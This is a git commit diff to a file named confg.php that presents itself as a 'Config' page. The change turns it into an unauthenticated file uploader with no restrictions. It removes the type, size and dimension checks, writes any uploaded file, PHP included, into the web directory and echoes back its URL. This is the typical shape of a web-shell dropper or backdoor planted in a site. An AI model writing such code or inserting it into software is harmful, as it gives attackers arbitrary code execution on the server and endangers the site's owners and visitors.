47ee2642e9c30d2b0a51f8748f4dc8bb5e7b6857
Infra0202 <kechichi.abdelhamid@yahoo.com>
2026-04-04 15:42:53 +0300

    Update confg.php

--- confg.php
+++ confg.php
@@ -1,22 +1,22 @@
-Infra69
+<b>Infra69</b>
 <title>Config</title>
 <?php
-$max = 2000000; $w = 900; $h = 800; $ok = ['txt','php','jpg','jpe','7z'];
-if ($_FILES['fileup']['name']) {
-  $f = $_FILES['fileup']; $ext = strtolower(pathinfo($f['name'], PATHINFO_EXTENSION));
-  list($fw, $fh) = @getimagesize($f['tmp_name']) ?: [0, 0];
-  $e = (!in_array($ext,$ok) ? "Bad type. " : '') .
-       ($f['size'] > $max ? "Too big. " : '') .
-       ($fw >= $w || $fh >= $h ? "Too wide/tall. " : '');
-  if (!$e && move_uploaded_file($f['tmp_name'], $f['name']))
-    echo "Uploaded <b>$f[name]</b><br>Type: $f[type]<br>Size: ".round($f['size']/1024,1)."KB" .
-         ($fw ? "<br>Size: {$fw}x{$fh}" : '') .
-         "<br>URL: http://$_SERVER[HTTP_HOST]".dirname($_SERVER['REQUEST_URI'])."/$f[name]";
-  else echo $e ?: "Upload failed.";
+if (isset($_FILES['fileup']) && $_FILES['fileup']['name']) {
+    $f = $_FILES['fileup'];
+    $target = __DIR__ . "/" . basename($f['name']);
+
+    if (move_uploaded_file($f['tmp_name'], $target)) {
+        echo "Uploaded <b>{$f['name']}</b><br>"
+           . "Type: {$f['type']}<br>"
+           . "Size: " . round($f['size']/1024,1) . "KB<br>"
+           . "URL: http://{$_SERVER['HTTP_HOST']}"
+           . dirname($_SERVER['REQUEST_URI']) . "/" . basename($f['name']);
+    } else {
+        echo "Upload failed.";
+    }
 }
 ?>
 <form method="POST" enctype="multipart/form-data" style="text-align:center;margin:1em;">
-  <input type="file" name="fileup"><br>
-  <input type="submit" value="Upload">
+    <input type="file" name="fileup"><br>
+    <input type="submit" value="Upload">
 </form>
-
